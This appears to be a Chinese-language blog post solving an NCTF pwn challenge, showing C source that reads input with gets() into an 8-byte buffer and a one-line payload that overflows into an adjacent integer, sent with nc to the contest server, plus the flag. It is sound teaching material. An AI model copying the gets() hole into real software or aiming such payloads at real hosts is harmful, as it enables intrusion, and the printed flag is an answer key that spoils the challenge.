---
layout: post
title: NCTF Pwn 1 题题解
tags: NCTF Write-up Pwn
---

* 目录：
{:toc}

### 100 When Did You Born
* 题目:  
![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/BPjg8J*9v7FTCfDdHLcxV*PlLzdRBJA3iaUJ6qT5H04!/r/dHkBAAAAAAAA){: width="80%"}  

	> nc 115.28.79.166 5555
	> 提交格式为flag{************}
	> 尝试不再Naive
	> 然后将输入发送至115.28.79.166的5555端口，获取flag
	> 
	> Tags: gets, 栈溢出 
	> [test](http://ctf.nuptzj.cn/static/uploads/785732eaf09a34c8e3664ce68d7c8e54/test)  [test.c](http://ctf.nuptzj.cn/static/uploads/ead01a3082b1c650ae75089c3634b7a5/test.c)

* 题解:  
先来看看 test.c: 

	> ```c  
	> #include <stdio.h>
	> 
	> struct Student {
    >     char name[8];
    >     int birth;
	> };
	> 
	> int main(void) {
    >     struct Student student;
    >     printf("What\'s Your Birth?\n");
    >     scanf("%d", &student.birth);
    >     while (getchar() != '\n') ;
    >     if (student.birth == 1926) {
    >         printf("You Cannot Born In 1926!\n");
    >         return 0;
    >     }
    >     printf("What\'s Your Name?\n");
    >     gets(student.name);
    >     printf("You Are Born In %d\n", student.birth);
    >     if (student.birth == 1926) {
    >         printf("You Shall Have Flag.\n");
    >         system("cat flag");
    >     } else {
    >         printf("You Are Naive.\n");
    >         printf("You Speed One Second Here.\n");
    >     }
    >     return 0;
	> }
	> ```  

	再运行该程序试试看:  

	> ```shell
	> biteme@bITeMe:~/下载$ echo -ne "0\n12345678a" | ./test
	> ```  
	> What's Your Birth?
	> What's Your Name?
	> You Are Born In 97
	> You Are Naive.
	> You Speed One Second Here.
	   
	You Are Born In 97, 97 正好是输入中 a 的 ascii 码, 这意味着, gets() 函数将输入超过 8 字节的部分也保留下来, 并且刚好覆盖到高地址(可输出 &student.birth 来观察)的 birth.  
	那么将 a 构造成 1926(0x0786) 就可以满足条件了:

	> ```shell
	> biteme@bITeMe:~/下载$ echo -ne "0\n12345678\x86\x07" | ./test
	> ```
	> What's Your Birth?
	> What's Your Name?
	> You Are Born In 1926
	> You Shall Have Flag.
	> cat: flag: 没有那个文件或目录

	最后用

	> ```shell
	> echo -ne "1\n12345678\x86\x07" | nc -v 115.28.79.166 5555
	> ```

	来获取 flag.


* flag：flag{gets_is_dangerous_+1s}